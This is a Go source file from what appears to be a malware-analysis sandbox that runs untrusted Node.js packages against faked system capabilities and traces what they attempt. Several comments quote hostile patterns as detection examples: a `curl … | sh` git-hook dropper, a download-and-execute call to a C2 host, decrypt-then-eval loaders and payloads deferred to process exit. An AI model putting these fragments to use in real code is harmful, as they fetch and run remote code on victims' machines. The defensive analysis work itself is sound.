// Package sandbox runs untrusted Node.js code inside a pure-Go goja interpreter
// with a fully faked Node environment. Nothing the sample does touches the real
// host: every capability (fs, network, process spawning, env) is a Go stub that
// returns plausible fake results and records the attempt to the tracer.
package sandbox

import (
	"fmt"
	"strings"
	"sync/atomic"
	"time"

	"scbox/internal/third_party/goja"

	"scbox/internal/trace"
	"scbox/internal/vfs"
)

// Config controls a single analysis run.
type Config struct {
	Timeout      time.Duration // wall-clock budget for each entry point / callback
	TotalBudget  time.Duration // hard cap on the whole analysis (DoS guard)
	Platform     string        // fake os/process platform, e.g. "linux"
	FS           *vfs.FS       // in-memory package tree; module/source reads come from here
	BaseDir      string        // virtual package root (== VirtualBase); used for module resolution
	VirtualBase  string        // believable path reported to the sample
	Explore      bool          // force-execute exports/files after load
	MaxTimers    int           // cap on drained timer callbacks
	MaxCallStack int           // cap on JS call-stack depth (stack-overflow DoS guard)
	MaxExplore   int           // cap on TOTAL force-exec invocations across the whole run
}

// Runtime is one analysis context: a goja VM, the tracer it reports to, and the
// module loader. Not safe for concurrent script execution (goja isn't); the
// only cross-goroutine touch is Interrupt from the deadline/budget timers.
type Runtime struct {
	vm  *goja.Runtime
	tr  *trace.Tracer
	cfg Config

	ld      *loader
	profile hostProfile

	// Captured references to the internal Proxy factories so they keep working
	// after their global names are deleted (see hideInternals).
	mkFake      goja.Value
	mkEnvProxy  goja.Value
	fetchedData goja.Value

	// forceThrowRequire makes every unresolved bare require() throw MODULE_NOT_FOUND
	// (the dropper-catch detonation pass); see ExploreFiles.
	forceThrowRequire bool

	// objectProto caches Object.prototype as the stop point for prototype-method
	// force-execution (see ForceExecute).
	objectProto *goja.Object

	// vfs is an in-memory filesystem: writes are remembered so a subsequent
	// read returns exactly what was written (write/read-back consistency is a
	// sandbox-detection check). Nothing ever reaches the real disk.
	vfs map[string]string

	// fdPaths maps an open file descriptor to its path so fd-based I/O
	// (openSync→writeSync/readSync) lands in the vfs and is captured like the
	// path-based fs calls. nextFd hands out believable descriptor numbers.
	fdPaths map[int64]string
	nextFd  int64

	// clockOffsetMs is the virtual-time offset (see evasion.go); it advances as
	// timers "elapse" so timing-based sandbox checks see real time pass.
	clockOffsetMs float64

	// aborted is set once the total analysis budget is exhausted; all further
	// execution becomes a no-op so a malicious loop can't keep the host busy.
	aborted   atomic.Bool
	budgetTmr *time.Timer

	// pending timer/microtask callbacks, drained after the main script so
	// delayed payloads (setTimeout(...,5000)) still detonate.
	pending []timerJob

	// exitHandlers are process 'exit'/'beforeExit'/signal listeners the sample
	// registered; fired after the timer drain so a payload deferred to process exit
	// (`process.on('exit', () => exec(...))`) still detonates.
	exitHandlers []goja.Callable

	// exploreCount is the cumulative number of force-exec invocations across the
	// whole run, bounded by cfg.MaxExplore so a big bundled library can't make
	// the sweep run for tens of seconds.
	exploreCount    int
	exploreCapNoted bool

	// bridgeDepth bounds re-entrant child_process node bridging so a payload that
	// re-execs itself (spawn('node',[self,'--bg'])) detonates its next stage but
	// can't recurse without limit.
	bridgeDepth int

	// decipherOut remembers the plaintext strings returned by createDecipheriv so
	// the eval hook can recognise a decrypt-then-execute loader (`eval(decrypt(blob))`)
	// structurally: the value handed to eval is the very string our decipher
	// returned, so a match proves the pattern REGARDLESS of the cipher algorithm or
	// whether our decryption produced valid code (a blowfish/DES/RC4 blob we can't
	// decrypt still yields garbage that the sample evals - same string, still
	// caught). Bounded to the most recent entries.
	decipherOut []string

	// exploreQuiet is set while ForceExecute fuzzes exports. Exceptions thrown
	// during that sweep are caused by the sandbox's own synthetic arguments
	// (e.g. passing "test" where a real object was expected), not by the sample
	// doing anything - so they're not recorded as trace events or scanned for
	// IOCs. Genuine import-time and timer-callback errors run outside the sweep
	// and are still recorded.
	exploreQuiet bool
}

// maxDecipherOut bounds the remembered decipher plaintexts (recent-wins).
const maxDecipherOut = 64

// noteDecipherOutput records a decipher plaintext for later eval-body matching.
// Trivial (very short) outputs are skipped: they collide with ordinary strings
// and a loader's payload is never a couple of bytes.
func (r *Runtime) noteDecipherOutput(s string) {
	if len(s) < 8 {
		return
	}
	r.decipherOut = append(r.decipherOut, s)
	if len(r.decipherOut) > maxDecipherOut {
		r.decipherOut = r.decipherOut[len(r.decipherOut)-maxDecipherOut:]
	}
}

// evalBodyFromDecipher reports whether an eval/Function body is (or embeds) a
// string a decipher just produced - the decrypt-then-execute loader tell.
func (r *Runtime) evalBodyFromDecipher(body string) bool {
	if len(body) < 8 {
		return false
	}
	for _, out := range r.decipherOut {
		if body == out || strings.Contains(body, out) || strings.Contains(out, body) {
			return true
		}
	}
	return false
}

// timerJob is a queued callback plus the delay it was scheduled with, so the
// virtual clock can advance believably when it runs.
type timerJob struct {
	cb    goja.Callable
	delay float64      // milliseconds
	args  []goja.Value // extra args Node forwards: setTimeout(cb, delay, ...args)
	muted bool         // scheduled during a fuzz sweep ⇒ replay muted (excluded from verdict)
}

// New builds a Runtime with the full fake Node environment installed.
func New(tr *trace.Tracer, cfg Config) *Runtime {
	if cfg.Timeout <= 0 {
		cfg.Timeout = 5 * time.Second
	}
	if cfg.TotalBudget <= 0 {
		cfg.TotalBudget = 30 * time.Second
	}
	if cfg.Platform == "" {
		cfg.Platform = "linux"
	}
	if cfg.MaxTimers <= 0 {
		cfg.MaxTimers = 1000
	}
	if cfg.MaxCallStack <= 0 {
		cfg.MaxCallStack = 2000
	}
	// MaxExplore <= 0 means UNLIMITED: every file is detonated and every export
	// fuzzed, no whole-run ceiling. A malicious payload can hide in any file
	// (including bundled/test files) and fire late, so full coverage is the
	// default. It stays a tunable knob for callers that want to bound a run.
	prof := defaultProfile()
	if cfg.VirtualBase == "" {
		// A believable project checkout path under the dev user's home.
		cfg.VirtualBase = prof.Homedir + "/projects/web-app"
	}
	r := &Runtime{vm: goja.New(), tr: tr, cfg: cfg, profile: prof, vfs: map[string]string{}, fdPaths: map[int64]string{}, nextFd: 12}
	// Bound recursion so deep JS recursion throws a catchable RangeError instead
	// of overflowing the Go goroutine stack and crashing the analyzer.
	r.vm.SetMaxCallStackSize(cfg.MaxCallStack)
	// Hard wall-clock cap on the entire run.
	r.budgetTmr = time.AfterFunc(cfg.TotalBudget, func() {
		r.aborted.Store(true)
		r.vm.Interrupt("total analysis budget exceeded")
	})
	r.ld = newLoader(r)
	r.installGlobals()
	r.installEval()
	r.ld.installBootstrap()
	r.installAntiEvasion()
	r.installNodeCompat()
	r.hideInternals()
	return r
}

// hideInternals removes the sandbox's instrumentation globals from globalThis
// after they've been captured into closures/Go fields, and de-enumerates the
// module-scope globals - so a sample enumerating globalThis sees an ordinary
// Node global object, not telltale __trace_*/__mkFake hooks.
func (r *Runtime) hideInternals() {
	_, _ = r.vm.RunString(`(function(){
      var del = ['__trace_fake_call','__trace_env','__trace_eval','__trace_decode','__trace_net','__clock_offset','__mkFake','__mkEnvProxy','__fetchedData'];
      for (var i = 0; i < del.length; i++) { try { delete globalThis[del[i]]; } catch (e) {} }
      var hide = ['require','global','XMLHttpRequest','importScripts','WebSocket'];
      for (var j = 0; j < hide.length; j++) {
        try {
          var d = Object.getOwnPropertyDescriptor(globalThis, hide[j]);
          if (d) { d.enumerable = false; Object.defineProperty(globalThis, hide[j], d); }
        } catch (e) {}
      }
    })();`)
}

// Close releases the budget timer.
func (r *Runtime) Close() {
	if r.budgetTmr != nil {
		r.budgetTmr.Stop()
	}
}

// stopped reports whether the global analysis budget has been exhausted.
func (r *Runtime) stopped() bool { return r.aborted.Load() }

// setQuiet toggles the force-execute fuzz-sweep flag and keeps the tracer's
// "muted" state in lockstep, so behavior provoked by the sweep is recorded but
// excluded from the verdict (see trace.Tracer.SetMuted). Returns the previous
// value for save/restore around nested sweeps.
func (r *Runtime) setQuiet(q bool) bool {
	prev := r.exploreQuiet
	r.exploreQuiet = q
	r.tr.SetMuted(q)
	return prev
}

// vfsWrite records a write to the in-memory filesystem (logged + captured as a
// dropped-file IOC by callers).
func (r *Runtime) vfsWrite(path, data string, appendMode bool) {
	if appendMode {
		r.vfs[path] += data
	} else {
		r.vfs[path] = data
	}
	r.recordIfExecutable(path, data)
}

// recordIfExecutable treats content written to a hook/boot/script location (or any
// file beginning with a shebang) as a command, so the command-based signatures
// evaluate DROPPED scripts. This is what distinguishes a malicious git-hook
// dropper (e.g. writing `curl … | sh` into .git/hooks/pre-commit) from a benign
// hook manager like husky writing inert wrapper scripts: the path alone scores
// only weakly, but a hostile hook's content trips the downloader/reverse-shell
// signatures and reaches a malicious verdict.
func (r *Runtime) recordIfExecutable(path, data string) {
	if r.tr == nil || strings.TrimSpace(data) == "" {
		return
	}
	lp := strings.ToLower(path)
	if strings.HasPrefix(strings.TrimLeft(data, " \t"), "#!") ||
		strings.HasSuffix(lp, ".sh") || strings.HasSuffix(lp, ".bash") ||
		strings.Contains(lp, "/hooks/") || strings.Contains(lp, ".husky/") {
		r.tr.AddCommand(data)
	}
}

// vfsRead returns content for a path: a sample's own prior write (the overlay)
// takes precedence, otherwise the materialized package source from the base FS.
// Nothing is ever read from the real disk.
func (r *Runtime) vfsRead(p string) (string, bool) {
	if c, ok := r.vfs[p]; ok {
		return c, true
	}
	if r.cfg.FS != nil {
		if b, ok := r.cfg.FS.Read(vfs.Clean(p)); ok {
			return string(b), true
		}
	}
	return "", false
}

// vfsDelete removes a path from the in-memory filesystem.
func (r *Runtime) vfsDelete(path string) { delete(r.vfs, path) }

// pathExists answers an existence probe (fs.existsSync/accessSync) the way a real
// freshly-provisioned victim machine would, defeating two evasion checks at once:
//   - VM/sandbox artifacts (/.dockerenv, …) read as ABSENT so the sample doesn't
//     conclude it's being analysed.
//   - a dropper's own download target under a temp/staging dir reads as ABSENT
//     until the sample actually writes it, so a `if (existsSync(target)) return;`
//     guard doesn't make the loader skip its download-and-execute stage.
// Everything else (real system binaries, the package's own files, anything the
// sample has written into the vfs) reads as present, so legitimate existence
// checks the payload relies on still pass and it proceeds to detonate.
func (r *Runtime) pathExists(p string) bool {
	if looksLikeSandboxArtifact(p) {
		return false
	}
	if _, ok := r.vfsRead(p); ok {
		return true
	}
	return !looksLikeDropTarget(p)
}

// VM exposes the underlying interpreter for the loader/explorer.
func (r *Runtime) VM() *goja.Runtime { return r.vm }

// Tracer returns the run's tracer.
func (r *Runtime) Tracer() *trace.Tracer { return r.tr }

// Config returns the run configuration.
func (r *Runtime) Config() Config { return r.cfg }

// RunModuleFile loads and executes a file with CommonJS module semantics,
// returning its exports. Used for `node <file>` lifecycle commands and the
// package entry point.
func (r *Runtime) RunModuleFile(abs string) goja.Value { return r.ld.loadFile(abs) }

// Require resolves a module specifier from the package root. It recovers any
// panic - notably the MODULE_NOT_FOUND thrown when an entry point can't be
// resolved (a package with no index.js / an exports-only manifest), or any goja
// exception escaping the top-level load. This call originates in Go with no JS
// try/catch frame above it, so without the recover a thrown require would crash
// the whole worker instead of being absorbed as a normal module-load failure.
func (r *Runtime) Require(spec string) (v goja.Value) {
	defer func() {
		if e := recover(); e != nil {
			r.tr.Note(trace.CatModule, "require-error", safePanic(e), spec)
			v = goja.Undefined()
		}
	}()
	return r.ld.require(spec, r.cfg.BaseDir)
}

// safePanic renders a recovered panic value as a bounded string. A goja panic
// carries a *goja.Exception whose thrown value may be a deeply-nested, cyclic,
// or otherwise hostile object; formatting it with fmt's reflect-based %v can
// recurse until the Go stack overflows and the host process dies (uncatchable).
// We stringify through goja's own String() (bounded by the VM call-stack limit)
// for exceptions, and never reflect into an arbitrary value.
func safePanic(e any) string {
	const max = 2048
	clip := func(s string) string {
		if len(s) > max {
			return s[:max] + "…"
		}
		return s
	}
	switch v := e.(type) {
	case *goja.Exception:
		// Value().String() runs goja toString under the stack-size guard.
		return clip(v.Value().String())
	case error:
		return clip(v.Error())
	case string:
		return clip(v)
	default:
		// Type only - never the value, to avoid any reflect recursion.
		return fmt.Sprintf("%T", e)
	}
}

// exitSentinel is the panic value process.exit() throws to unwind the JS stack.
const exitSentinel = "__scbox_process_exit__"

// isExitSentinel reports whether a recovered panic / call error is the
// process.exit unwind signal rather than a real fault. The exit itself is
// already recorded where process.exit is called, so callers use this to avoid
// re-reporting it as a spurious "halted"/"call-error".
func isExitSentinel(s string) bool { return strings.Contains(s, exitSentinel) }

// must unwraps a goja Set error (only fails on programmer error).
func must(err error) {
	if err != nil {
		panic(fmt.Errorf("sandbox: object set: %w", err))
	}
}

// set is a terse *goja.Object.Set that panics on error.
func set(o *goja.Object, name string, v any) { must(o.Set(name, v)) }

// fn adapts a Go closure into a JS-callable value.
func (r *Runtime) fn(f func(call goja.FunctionCall) goja.Value) goja.Value {
	return r.vm.ToValue(f)
}

// obj makes a fresh empty JS object.
func (r *Runtime) obj() *goja.Object { return r.vm.NewObject() }

// throw raises a JS exception inside the VM.
func (r *Runtime) throw(format string, a ...any) {
	panic(r.vm.ToValue(fmt.Sprintf(format, a...)))
}

// argStr renders a call argument as a string for logging, truncating blobs.
func argStr(v goja.Value) string {
	if v == nil || goja.IsUndefined(v) || goja.IsNull(v) {
		return ""
	}
	s := v.String()
	const max = 2048
	if len(s) > max {
		return s[:max] + "...(truncated)"
	}
	return s
}

// argStrs renders all arguments of a call.
func argStrs(call goja.FunctionCall) []string {
	out := make([]string, 0, len(call.Arguments))
	for _, a := range call.Arguments {
		out = append(out, argStr(a))
	}
	return out
}

// RunString executes top-level script source under the deadline, recovering
// from any throw/interrupt so the host process is never affected.
func (r *Runtime) RunString(name, src string) (val goja.Value, err error) {
	prog, cerr := goja.Compile(name, src, false)
	if cerr != nil {
		r.tr.Note(trace.CatEval, "compile-error", cerr.Error(), name)
		return nil, cerr
	}
	return r.runProgram(name, prog)
}

func (r *Runtime) runProgram(name string, prog *goja.Program) (val goja.Value, err error) {
	if r.stopped() {
		return goja.Undefined(), fmt.Errorf("analysis budget exhausted")
	}
	defer func() {
		if e := recover(); e != nil {
			msg := safePanic(e)
			err = fmt.Errorf("%s", msg)
			if !isExitSentinel(msg) {
				r.tr.Note(trace.CatExplore, "halted", msg, name)
			}
		}
	}()
	timer := time.AfterFunc(r.cfg.Timeout, func() { r.vm.Interrupt("timeout exceeded") })
	defer timer.Stop()
	val, err = r.vm.RunProgram(prog)
	if !r.stopped() {
		r.vm.ClearInterrupt()
	}
	return val, err
}

// safeCall invokes a JS callable under recovery (used for timers/exports).
func (r *Runtime) safeCall(what string, fn goja.Callable, this goja.Value, args ...goja.Value) (ret goja.Value) {
	if r.stopped() {
		return goja.Undefined()
	}
	defer func() {
		if e := recover(); e != nil {
			if msg := safePanic(e); !r.exploreQuiet && !isExitSentinel(msg) {
				r.tr.Note(trace.CatExplore, "call-halted", msg, what)
			}
			ret = goja.Undefined()
		}
	}()
	timer := time.AfterFunc(r.cfg.Timeout, func() { r.vm.Interrupt("timeout exceeded") })
	defer timer.Stop()
	v, err := fn(this, args...)
	if !r.stopped() {
		r.vm.ClearInterrupt()
	}
	if err != nil {
		// A thrown exception during the force-exec fuzz sweep is an artifact of
		// our synthetic arguments, not sample behavior - drop it. The process.exit
		// sentinel is normal control flow (already recorded), never an error.
		if msg := safePanic(err); !r.exploreQuiet && !isExitSentinel(msg) {
			r.tr.Note(trace.CatExplore, "call-error", msg, what)
		}
		return goja.Undefined()
	}
	return v
}

// pumpMicrotasks forces goja to drain its pending Promise/async job queue now.
// goja only runs that queue at a non-recursive RunProgram boundary (leave()), and
// crucially DISCARDS it on any interrupt (leaveAbrupt sets jobQueue = nil). During
// the force-execute sweep one file's timeout/interrupt would therefore throw away
// another file's deferred async payload - e.g. a download-and-execute IIFE
// `(async()=>{ await axios.get(c2).then(r=>Function(r.data.x)()) })()` whose
// continuation is still queued. Running an empty top-level program triggers
// leave() and drains the queue immediately, so each file's async detonates before
// a later file can clear it. Recovered + budget-guarded like any other JS entry.
func (r *Runtime) pumpMicrotasks() {
	if r.stopped() {
		return
	}
	defer func() { _ = recover() }()
	_, _ = r.vm.RunString("")
}

// FireExitHandlers invokes the process 'exit'/'beforeExit'/signal listeners the
// sample registered. Malware routinely defers its payload to process teardown
// (`process.on('exit', () => require('child_process').exec(...))`) so it runs only
// after a benign-looking body finishes; firing these makes that payload detonate.
// Run after the timer drain, scored normally (this is the sample's own behavior).
func (r *Runtime) FireExitHandlers() {
	for n := 0; n < 64 && len(r.exitHandlers) > 0; n++ {
		if r.stopped() {
			return
		}
		cb := r.exitHandlers[0]
		r.exitHandlers = r.exitHandlers[1:]
		r.safeCall("exit-handler", cb, goja.Undefined())
	}
	r.exitHandlers = nil
}

// DrainTimers runs queued timer/microtask callbacks (ignoring real delays) so
// time-delayed payloads execute within the analysis window.
func (r *Runtime) DrainTimers() {
	for n := 0; n < r.cfg.MaxTimers && len(r.pending) > 0; n++ {
		if r.stopped() {
			return
		}
		// Run the earliest-scheduled timer next, advancing the virtual clock to
		// its fire time so code that measured elapsed time sees it pass.
		next := 0
		for i := 1; i < len(r.pending); i++ {
			if r.pending[i].delay < r.pending[next].delay {
				next = i
			}
		}
		job := r.pending[next]
		r.pending = append(r.pending[:next], r.pending[next+1:]...)
		// Advance virtual time to this timer's fire point (monotonic), so a
		// callback that checks Date.now() sees the delay it asked for elapse.
		if job.delay > r.clockOffsetMs {
			r.clockOffsetMs = job.delay
		}
		// Suppress the callback's trailing uncaught throw (noise: drained without a
		// real event loop), but preserve verdict scoring for a genuine delayed
		// payload - setTimeout(maliciousFn, 5000) is a real technique. A timer
		// scheduled DURING the fuzz sweep replays muted (job.muted); one scheduled
		// by the sample's own code scores normally.
		prevMuted := r.tr.SetMuted(job.muted)
		prevQuiet := r.exploreQuiet
		r.exploreQuiet = true
		r.safeCall("timer-callback", job.cb, goja.Undefined(), job.args...)
		r.exploreQuiet = prevQuiet
		r.tr.SetMuted(prevMuted)
	}
	if len(r.pending) > 0 {
		r.tr.Note(trace.CatTimer, "timer-cap-reached", fmt.Sprintf("%d callbacks dropped", len(r.pending)))
		r.pending = nil
	}
}
